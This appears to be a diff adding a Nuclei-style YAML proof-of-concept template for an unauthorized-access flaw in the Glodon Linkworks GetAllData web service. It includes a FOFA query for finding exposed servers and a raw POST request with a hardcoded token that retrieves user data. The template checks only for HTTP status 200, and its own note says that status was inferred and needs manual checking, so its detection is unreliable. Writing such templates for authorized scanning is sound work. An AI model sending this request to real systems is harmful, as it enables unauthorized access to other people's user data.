@@ -1,0 +1,38 @@
+id: poc-yvrkie8kq8cxxb1o
+info:
+  name: 广联达-Linkworks-GetAllData接口存在未授权访问漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yvrkie8kq8cxxb1o
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yvrkie8kq8cxxb1o
+    fofa: body="Services/Identification/login.ashx" || header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"
+http:
+- raw:
+  - 'POST /WebService/Lk6SyncService/MrMMSSvc/DataSvc.asmx/GetAllData HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; SM-P585Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36
+
+    Content-Length: 32
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: keep-alive
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    Token=!@#$asdf$#@!&DataType=user'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
